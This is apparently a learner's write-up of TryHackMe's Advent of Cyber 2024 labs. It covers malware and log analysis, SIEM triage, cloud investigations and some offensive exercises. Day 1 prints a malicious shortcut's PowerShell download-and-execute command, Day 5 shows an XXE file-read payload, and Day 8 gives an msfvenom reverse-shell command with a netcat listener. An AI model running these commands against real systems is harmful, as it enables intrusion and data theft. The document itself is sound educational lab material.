# Advent of Cyber 2024

## Day 1
This challenge required us to investigate a Youtube to MP3 converter site named “The Glitch’s All-in-one Converter” I started off by launching the Attack box and starting the virtual machine. I accessed the machine by typing 10.10.214.113 on the web browser. 

<img width="1470" alt="Pasted Graphic 22" src="https://github.com/user-attachments/assets/675c4ff1-a763-49c7-9a25-9c2a7f69099d">

On the website, I entered the YouTube video link provided in the description. I selected the MP3 format.

<img width="1070" alt="Format Selection Protocol" src="https://github.com/user-attachments/assets/3e873ea7-a254-40d9-9c0a-c9b862ab0ce6">

After this, I clicked on the download file option to download the MP3 file. A zip file was downloaded.
￼
<img width="1470" alt="Pasted Graphic 24" src="https://github.com/user-attachments/assets/040e058d-936a-4f36-b7ea-85ae80fa06c6">

I then looked for the zip file in the root directory and clicked on the extract to option in the Edit menu to extract the contents of the zip file. Two files named song.mp3 and somg.mp3 were extracted.

<img width="1326" alt="Pasted Graphic 25" src="https://github.com/user-attachments/assets/6e3d7248-11f4-4c86-aba5-50a9d6be8ccf">

Then to determine their file type, I went to terminal and ran the commands `file song.mp3` and `file somg.mp3` to check their file type.
```
root@ip-10-10-129-168:~# file song.mp3
song.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
root@ip-10-10-129-168:~# file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
root@ip-10-10-129-168:~# 
```

Then I used the exitfool tool to inspect the somg.mp3 file.

```
root@ip-10-10-129-168:~# exiftool somg.mp3
ExifTool Version Number         : 11.88
File Name                       : somg.mp3
Directory                       : .
File Size                       : 2.1 kB
File Modification Date/Time     : 2024:10:30 14:32:52+00:00
File Access Date/Time           : 2024:12:05 12:18:02+00:00
File Inode Change Date/Time     : 2024:12:05 12:15:14+00:00
File Permissions                : rw-r--r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 08:14:14+01:00
Access Date                     : 2018:09:15 08:14:14+01:00
Modify Date                     : 2018:09:15 08:14:14+01:00
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
root@ip-10-10-129-168:~# 
```
I could see the powershell command being used in the above output. I opened the powershell script using the given url: https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1

```
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}
```

Here was a clue about the identity of the creator of the script, the initials M.M. I searched "Created by the one and only M.M." on GitHub and clicked on the issues column.

<img width="1105" alt="Pasted Graphic 26" src="https://github.com/user-attachments/assets/39f30a7f-1884-4fb1-9e85-d952cc15a7a5">

Then I decided to take a look at the questions for this challenge. The first one was “Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? “ So I ran the command exiftool song.mp and noticed the name Tyler Ramsbey. 

Img

The next question was “The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?”. I clicked on the 3rd result in Issues on GitHub
<img width="1470" alt="Python Version of this #7" src="https://github.com/user-attachments/assets/42f088fc-9036-4cb3-8532-e27b9ee5910b">
<img width="1470" alt="Pasted Graphic 28" src="https://github.com/user-attachments/assets/1759af4a-1553-4bb5-be0f-41da9df45e10">

Here, the url http://papash3ll.thm/data was written. 
Then the question was “Who is M.M? Maybe his Github profile page would provide clues?” I searched around GitHub, found the GitHub profile of M.M and got the name “Mayor Malware” from a repository on the profile. 

<img width="1024" alt="Pasted Graphic 29" src="https://github.com/user-attachments/assets/c0753a4a-3a70-47f7-8701-e7036c11ec3c">

The next question was “What is the number of commits on the GitHub repo where the issue was raised?”. So I checked the CryptoWallet-Search repo and found the number of commits to be 1.

<img width="1038" alt="Pasted Graphic 30" src="https://github.com/user-attachments/assets/30e138c9-1cc9-43c0-9ee3-54598f495ce0">

<img width="1466" alt="Pasted Graphic 31" src="https://github.com/user-attachments/assets/b8bee0ce-d695-413d-927e-732c22c9c6dd">


-New concepts
1. I came across Powershell which is a command-line shell and scripting language used to automate tasks and manage systems in Windows environments. The powershell script in here was designed to collect highly sensitive information and send it to an attacker's remote server.
2. I got a basic idea about OPSEC which stands for Operational Security

## Day 2
This challenge required us to identify if an alert was a True Positive (TP) or a False Positive (FP). I started off by starting the machine. Then I clicked on the https://10-10-244-229.p.thmlabs.com link to connect to the Elastic SIEM. I logged in to the site using the provided credentials. Then I went to the Discover tab present in the menu in the top left corner to see the events. I set the date to Dec 1st, 2024 and the time frame between 0900 and 0930 as the alert was triggered around this time.
<img width="644" alt="Options" src="https://github.com/user-attachments/assets/f91095f1-e87f-42db-a7e0-6c4a95a2676e">

There were 21 events during this timeframe.
<img width="1463" alt="Pasted Graphic 52" src="https://github.com/user-attachments/assets/9c06d5b9-a9b4-4021-a645-09aa56e8fff4">

I added some columns and then analyzed the events.
<img width="1463" alt="Pasted Graphic 53" src="https://github.com/user-attachments/assets/ed7f2b9b-2428-4e9b-be8c-a885b5e4502b">

The same powershell command was being executed on multiple machines. I expanded the time frame from 29th of November to the 1st of December. Then on adding some filters it was observed that the user could have done a brute force attack on 1st of December as there was an authentication success observed.
<img width="1463" alt="Pasted Graphic 54" src="https://github.com/user-attachments/assets/c2b7729d-addb-47e1-903b-c7c06333b986">

I also checked the number of failed logons by setting failure as a filter. It was 6791.
<img width="1463" alt="Pasted Graphic 57" src="https://github.com/user-attachments/assets/71342480-b474-4122-988c-98814a34a643">

Then I opened CodeChef to decode the PowerShell commands as they are in Base64 format. 
<img width="1463" alt="Pasted Graphic 56" src="https://github.com/user-attachments/assets/acd842ad-8ebe-4fdf-b6d3-dc4670a52081">

Then I answered the questions for this task.
<img width="1341" alt="Pasted Graphic 59" src="https://github.com/user-attachments/assets/dca7b467-dedc-4286-acf2-86d641130b98">


### -New concepts:
1. I discovered what a SIEM is. It basically aggregates different events and information. It triggers an alert if it detects malicious activity. This alert could either be a TP or FP.

## Day 3 
In this task I followed the demonstration on how to use ELK which are three open-source tools that are commonly used together to collect, store, analyse, and visualise data. I opened elastic using the given url. I selected the wareville-rails collection and added some filters to narrow down my search and view the events. 

<img width="1293" alt="image" src="https://github.com/user-attachments/assets/e798cbb1-a52f-4739-a6cc-01f1acdb6272" />


### -New concepts
1. KQL, or Kibana Query Language, is an easy-to-use language that can be used to search documents for values.



## Day 4 
I started off by connecting to the virtual machine and opening PowerShell. In PowerShell I entered the command Get-Help Invoke-Atomictest followed by Invoke-AtomicTest T1566.001 -ShowDetails. This command displays the details of all tests included in the T1566.001 Atomic. I executed a few more commands to see how emulation works. 
Then I opened the Event Viewer and navigated to Applications and Services => Microsoft => Windows => Sysmon => Operational then cleared the log.

<img width="1470" alt="image" src="https://github.com/user-attachments/assets/7eda5467-c8e8-47c4-86aa-ceca75fbe796">

After rexecuting the command `Invoke-AtomicTest T1566.001 -TestNumbers 1` I went back to the Event Viewer and refreshed.
Then to find the first flag, I navigated to the directory C:\Users\Administrator\AppData\Local\Temp\ and catted the file PhishingAttachment.txt
```
PS C:\Users\Administrator> cd \Users\Administrator\AppData\Local\Temp\
PS C:\Users\Administrator\AppData\Local\Temp> cat PhishingAttachment.txt
THM{GlitchTestingForSpearphishing}
```

I searched for MITRE ATT&CK technique ID for Command and Scripting Interpreter on the internet. The ATT&CK technique ID was T1059. The  ATT&CK subtechnique ID focusing on the Windows Command Shell was T1059.003. I  executed `PS C:\Users\Administrator> Invoke-AtomicTest T1059.003  -ShowDetails`

```
[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T1059.003
Atomic Test Name: Simulate BlackByte Ransomware Print Bombing
Atomic Test Number: 4
Atomic Test GUID: 6b2903ac-8f36-450d-9ad5-b220e8a2dcb9
Description: This test attempts to open a file a specified number of times in Wordpad, then prints the contents.  It is
designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is ope
ned in Wordpad 75 times and then printed.  See https://redcanary.com/blog/blackbyte-ransomware/.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
cmd /c "for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}" | Out-null
Command (with inputs):
cmd /c "for /l %x in (1,1,1) do start wordpad.exe /p C:\Tools\AtomicRedTeam\atomics\T1059.003\src\Wareville_Ransomware.t
xt" | Out-null
```

I scrolled down the output and found the answer to the 4th question; the name of the Atomic Test to be stimulated was given in the output: Create and Execute Batch Script. The answer to the next question was the name of the file used in the test: Wareville_Ransomware.txt. Then, I looked for a flag in this test. I couldn't find any so I looked at the hint which suggested saving the PDF and reading it's content. I located the Wareville_Ransomware.txt file and opened it to view its contents. 

<img width="703" alt="image" src="https://github.com/user-attachments/assets/6a8950e3-7cf6-47e6-b218-30896568b948">

The flag was THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}

<img width="1319" alt="image" src="https://github.com/user-attachments/assets/db5dd682-4443-4999-a51d-4863124a2884">

## New concepts
1. MITRE ATT&CK is a opular framework for understanding the different techniques and tactics that threat actors perform through the kill chain.
2. The Atomic Red Team library is a collection of red team test cases that are mapped to the MITRE ATT&CK framework.

## Day 5
I opened burpsuite and entered the provided URL on the browser. I added the first item to my wishlist and on the Cart page, clickd on the Proceed to Checkout button to buy the item. Then I got the coressponding POST request in burpsuite by turning the intercept on and looking at the HTTP history. I sent the request to the repeater. Then I changed the payload to get the 
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
<wishlist>
	<user_id>1</user_id>
	<item>
	       <product_id>&payload;</product_id>
	</item>
</wishlist>
```


<img width="947" alt="image" src="https://github.com/user-attachments/assets/a3a38a23-efa2-43b6-870f-90cbd8511e1a" />

<img width="947" alt="image" src="https://github.com/user-attachments/assets/37c78b69-d02f-4928-8970-2d6a3c01eb40" />

<img width="1311" alt="image" src="https://github.com/user-attachments/assets/2aa99018-0e2d-4365-9f97-9e3dae0291b3" />



## Day 6
I started off by connecting to the virtual machine.
<img width="1470" alt="image" src="https://github.com/user-attachments/assets/eba5e61c-c76a-46ab-98d1-4dc0c39bc37a">

Then I typed the encoded dtring from the code on CodeChef. The output was: `Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion" -Name ProgramFilesDir`

<img width="1470" alt="image" src="https://github.com/user-attachments/assets/ebba1d1c-dfcc-40cc-89a1-af610c1e63c2">

The flag for question 1 was given here: THM{GlitchWasHere}.
On clicking on the MerryChristmasObf.exe file, there was no pop up. Then I entered the command `floss.exe C:\Tools\Malware\MerryChristmas.exe |Out-file C:\tools\malstrings.txt` in powershell.

<img width="854" alt="image" src="https://github.com/user-attachments/assets/526fb158-5ce3-4240-8cf6-a1a3b74ecf17">

I then opened the Malware.txt file and used the CTRL+F combination to search the flag by using THM.

<img width="979" alt="image" src="https://github.com/user-attachments/assets/040f0c62-37f6-423a-a638-7cf351d95ab0">

The flag given was THM{HiddenClue}.

<img width="1367" alt="image" src="https://github.com/user-attachments/assets/5ed2b265-93ec-496c-a786-42cc0c59f4b2">

### -New Concepts
1. A sandbox is an isolated environment where (malicious) code is executed without affecting anything outside the system.
2. YARA is a tool used to identify and classify malware based on patterns in its code.
3. Floss is a tool that can extract obfuscated strings from malware binaries.

## Day 7
First I started the machine and opened the terminal. Then I began with investigating the CloudTrail logs by executing the commands below.

```
ubuntu@tryhackme:~$ cd wareville_logs
ubuntu@tryhackme:~/wareville_logs$ ls
cloudtrail_log.json  rds.log
```
The commands that followed, filtered and narrowed down the output. To see all the events related to the anomalous user the following command was executed.

```
ubuntu@tryhackme:~/wareville_logs$ jq -r '["Event_Time", "Event_Name", "User_Name", "Bucket_Name", "Key", "Source_IP"],(.Records[] | select(.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares") | [.eventTime, .eventName, .userIdentity.userName // "N/A",.requestParameters.bucketName // "N/A", .requestParameters.key // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t
Event_Time            Event_Name        User_Name  Bucket_Name           Key                                         Source_IP
2024-11-28T15:22:23Z  ListObjects       glitch     wareville-care4wares  N/A                                         53.94.201.69
2024-11-28T15:22:25Z  ListObjects       glitch     wareville-care4wares  N/A                                         53.94.201.69
2024-11-28T15:22:39Z  PutObject         glitch     wareville-care4wares  bank-details/wareville-bank-account-qr.png  53.94.201.69
2024-11-28T15:22:39Z  PreflightRequest  N/A        wareville-care4wares  bank-details/wareville-bank-account-qr.png  53.94.201.69
2024-11-28T15:22:44Z  ListObjects       glitch     wareville-care4wares  N/A                                         53.94.201.69
ubuntu@tryhackme:~/wareville_logs$ 
```
Here we find the answer to the 1st and 2nd questions. The activity apart from ListObjects is PutObject. The source IP related to the S3 bucket activities of the user glitch is 53.94.201.69.
Then I used the following command.
```
ubuntu@tryhackme:~/wareville_logs$ jq -r '["Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"],(.Records[] | select(.userIdentity.userName == "glitch") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
```
The output had the answer to the third and fourth questions. The AWS service that generates the ConsoleLogin event is signin.amazonaws.com and the anomalous user triggered the ConsoleLogin event on 2024-11-28T15:21:54Z.
```
glitch     53.94.201.69
2024-11-28T15:21:54Z  signin.amazonaws.com                 ConsoleLogin
```
Then to look for who created this anomalous user account I used the following command
```
ubuntu@tryhackme:~/wareville_logs$ jq -r '["Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"], (.Records[] | select(.eventSource == "iam.amazonaws.com") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
```
followed by 
```
ubuntu@tryhackme:~/wareville_logs$ jq '.Records[] |select(.eventSource=="iam.amazonaws.com" and .eventName== "CreateUser")' cloudtrail_log.json
```
The following output snippet shows the username created by mcskidy user which is glitch.
```
  "eventTime": "2024-11-28T15:21:35Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateUser",
  "awsRegion": "ap-southeast-1",
  "sourceIPAddress": "53.94.201.69",
  "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
  "requestParameters": {
    "userName": "glitch"
  },
```
Then to view the permissions the anomalous user has I used the following command.
```
ubuntu@tryhackme:~/wareville_logs$ jq '.Records[] | select(.eventSource=="iam.amazonaws.com" and .eventName== "AttachUserPolicy")' cloudtrail_log.json
```
From a snippet of the output we can see that the AdministratorAccess was provided to the new user.
```
 "eventTime": "2024-11-28T15:21:36Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "AttachUserPolicy",
  "awsRegion": "ap-southeast-1",
  "sourceIPAddress": "53.94.201.69",
  "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
  "requestParameters": {
    "userName": "glitch",
    "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
  },
```
To look at the IP address and operating system related to all these anomalous events I used the following command.
```
ubuntu@tryhackme:~/wareville_logs$ jq -r '["Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"], (.Records[] | select(.sourceIPAddress=="53.94.201.69") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
```
In the output we can see some logins made by Mayor Malware.
```
2024-11-25T21:48:22Z  signin.amazonaws.com                 ConsoleLogin             mayor_malware  53.94.201.69
2024-11-26T22:55:51Z  signin.amazonaws.com                 ConsoleLogin             mayor_malware  53.94.201.69
```
Then I used the following command gathering the information for mcskidy
```
ubuntu@tryhackme:~/wareville_logs$ jq -r '["Event_Time","Event_Source","Event_Name", "User_Name","User_Agent","Source_IP"],(.Records[] | select(.userIdentity.userName=="mayor_ml") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A",.userAgent // "N/A",.sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
```
In the output the IP address to log into aws used by mcskidy was given: 31.210.15.79
```
2024-11-26T19:22:05Z  signin.amazonaws.com         ConsoleLogin          mcskidy    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36        31.210.15.79
```
Then I used the following command to get the bank transaction detaiols of mayor malware. The account number given in the output was: 2394 6912 7723 1294.
```
ubuntu@tryhackme:~/wareville_logs$ grep INSERT rds.log
```

<img width="1300" alt="image" src="https://github.com/user-attachments/assets/3624bfa7-0d78-453f-8ab0-78c218f2495f">
<img width="1300" alt="image" src="https://github.com/user-attachments/assets/1a5eff63-8d37-49af-b6f9-cc384f076165">

### -New concepts
1. AWS CloudWatch is a monitoring and observability platform that gives us greater insight into our AWS environment by monitoring applications at multiple levels.
2. Cloudtrail is used to monitor actions in an AWS environment.
3. JQ transforms and filters JSON data into meaningful data we can understand and use to gain security insights.
4. JSON is an open standard file and data interchange format that uses human-readable text to store and transmit data objects consisting of attribute–value pairs and arrays.

## Day 8
In this challenge we had to use a tool called msfvenom to get a reverse shell. I generated the reverse shell using the command `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.45.150 LPORT=4444 -f powershell`.

```
root@ip-10-10-45-150:~# nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.222.141 49901
Microsoft Windows [Version 10.0.17763.6293]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\glitch>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\glitch

12/20/2024  12:59 PM    <DIR>          .
12/20/2024  12:59 PM    <DIR>          ..
10/03/2024  10:56 PM    <DIR>          3D Objects
10/03/2024  10:56 PM    <DIR>          Contacts
11/11/2024  05:07 PM    <DIR>          Desktop
10/03/2024  10:56 PM    <DIR>          Documents
10/03/2024  10:56 PM    <DIR>          Downloads
10/03/2024  10:56 PM    <DIR>          Favorites
10/03/2024  10:56 PM    <DIR>          Links
10/03/2024  10:56 PM    <DIR>          Music
10/03/2024  10:56 PM    <DIR>          Pictures
10/03/2024  10:56 PM    <DIR>          Saved Games
10/03/2024  10:56 PM    <DIR>          Searches
10/03/2024  10:56 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  11,471,572,992 bytes free

C:\Users\glitch>type C:\Users\glitch\Desktop\flag.txt.
type C:\Users\glitch\Desktop\flag.txt.
AOC{GOT_MY_ACCESS_B@CK007}
```
I execute nc -nvlp 4444 to enable the attack box to receive data once the connection was made. Then in powershell I typed the code to execute the shellcode and I got a reverse shell in the AttackBox. There I used the command `type C:\Users\glitch\Desktop\flag.txt` to get the flag

### -New concepts
1. I learnt how to use msfvenom to get a reverse shell.

### FLAG: AOC{GOT _MY_ACCESS_B@CK007}

## Day 9
In this task, we had to assess the level of risk that each of the vendors pose. First we were introduced to risk assessments. Then I started the static site attached to this task. Analyzing the response to the three questions, we had to do the assessments for the three vendors. I described the potential security riskd, assigned the impact and likelihood. 

<img width="730" alt="image" src="https://github.com/user-attachments/assets/e2dc3644-69e2-41f1-92d1-3d2527c9aba2">

The risks were summarized at the end of the assessment.

<img width="730" alt="image" src="https://github.com/user-attachments/assets/93d8220e-275a-4791-a46c-810dc9a9e137">

The vendor with the lowest risk was silver falcon and on selecting it, I got the flag.

<img width="730" alt="image" src="https://github.com/user-attachments/assets/01696cc9-a583-465c-bf50-472182af25ce">
<img width="1380" alt="image" src="https://github.com/user-attachments/assets/ea34a040-8984-4199-8c32-b0e5eebe3d4a">


### -New concepts
1. Governance, Risk, and Compliance (GRC) plays a crucial role in any organisation to ensure that their security practices align with their personal, regulatory, and legal obligations.
2. I learnt how risk registers work.

## Day 10
I started off by running msfconsole on terminal to start the Metasploit Framework. Next, I executed some commands to listen for incoming connections when a target users opens our phishing Word document.
Then I wrote a mail to send the malicious document to the target usr. To attach the msf.docm file, I located it using ctrl+h to view the hidden files.
<img width="1353" alt="image" src="https://github.com/user-attachments/assets/8be238d3-1eab-40cb-bca4-37243b65fee1" />

After sending the mail, I got a reverse shell on my powershell. I listed the files and catted the flag file to get the flag.

<img width="733" alt="image" src="https://github.com/user-attachments/assets/9a6a3e8b-ae74-4821-92cc-adce3e9b87b0" />

### -New concepts
1. Metasploit is an open-source penetration testing framework that helps security professionals find and exploit vulnerabilities in computer systems.

## Day 11

### -New Concepts
1. I learnt about attacks on wifi.


## Day 16
I started off by signing in to the azure portal. The next step was to open the azure cloud shell in bash. I followed the commands specified in the challenge description and on running the `az ad user list --filter "startsWith('wvusr-', displayName)"` the password for backupware that was leaked. The password is in the following output snippet: R3c0v3r_s3cr3ts

```
  {
    "businessPhones": [],
    "displayName": "wvusr-backupware",
    "givenName": null,
    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "R3c0v3r_s3cr3ts!",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
  },
```
On running the `az ad group list` command I got the group ID of the Secret Recovery Group which was 7d96660a-02e1-4112-9515-1762d0cb66b7.
```
usr-12187506 [ ~ ]$ az ad group list
[
  {
    "classification": null,
    "createdDateTime": "2024-10-13T23:10:55Z",
    "creationOptions": [],
    "deletedDateTime": null,
    "description": "Group for recovering Wareville's secrets",
    "displayName": "Secret Recovery Group",
    "expirationDateTime": null,
    "groupTypes": [],
    "id": "7d96660a-02e1-4112-9515-1762d0cb66b7",
    "isAssignableToRole": null,
    "mail": null,
    "mailEnabled": false,
    "mailNickname": "f315e3ef-c",
    "membershipRule": null,
    "membershipRuleProcessingState": null,
    "onPremisesDomainName": null,
    "onPremisesLastSyncDateTime": null,
```
Then to see if secrets were stored in the warevillesecrets vault I ran the following command.
```
usr-12187506 [ ~ ]$ az keyvault secret list --vault-name warevillesecrets
[
  {
    "attributes": {
      "created": "2024-10-14T20:22:20+00:00",
      "enabled": true,
      "expires": null,
      "notBefore": null,
      "recoverableDays": 90,
      "recoveryLevel": "Recoverable+Purgeable",
      "updated": "2024-10-14T20:22:20+00:00"
    },
    "contentType": null,
    "id": "https://warevillesecrets.vault.azure.net/secrets/aoc2024",
    "managed": null,
    "name": "aoc2024",
    "tags": {}
  }
]
```
The name of the vault sectret is aoc2024. Then with the following command I could see the content of the secret vault.
```
usr-12187506 [ ~ ]$ az keyvault secret show --vault-name warevillesecrets --name aoc2024
{
  "attributes": {
    "created": "2024-10-14T20:22:20+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 90,
    "recoveryLevel": "Recoverable+Purgeable",
    "updated": "2024-10-14T20:22:20+00:00"
  },
  "contentType": null,
  "id": "https://warevillesecrets.vault.azure.net/secrets/aoc2024/7f6bf431a6a94165bbead372bca28ab4",
  "kid": null,
  "managed": null,
  "name": "aoc2024",
  "tags": {},
  "value": "WhereIsMyMind1999"
}
```
The value stored was "WhereIsMyMind1999"

<img width="1311" alt="image" src="https://github.com/user-attachments/assets/6b5af208-2d4e-4d2b-9406-3d85a0cc9082" />

### -New Concepts
1. I worked with Azure CLI for the first time.

## Day 17
In this challenge we were required to work with splunk to investigate the logs related to the incident scenario.
I looked at the statistics to find out the number of successful logins. It was 642.
<img width="1470" alt="image" src="https://github.com/user-attachments/assets/b2f47661-7f78-4c33-bc71-08663ce14ad3" />

Then to find the Session_id associated with the attacker who deleted the recording I entered `index=cctv_feed *Delete*` in the search box. It was rij5uu4gt204q0d3eb7jj86okt.
<img width="1470" alt="image" src="https://github.com/user-attachments/assets/e0adda0f-ec1a-4b8b-809f-70f50787ddc2" />

To find the name of the attacker found in the logs, who deleted the CCTV footage I used index=cctv_feed *lsr1743nkskt3r722momvhjcs3* as the filter. It was mmalware.
<img width="1470" alt="image" src="https://github.com/user-attachments/assets/75dda5b7-b4e7-4701-ae64-3bff3a56b448" />

<img width="1353" alt="image" src="https://github.com/user-attachments/assets/c689c3b4-f781-4938-a83c-1b353a592946" />
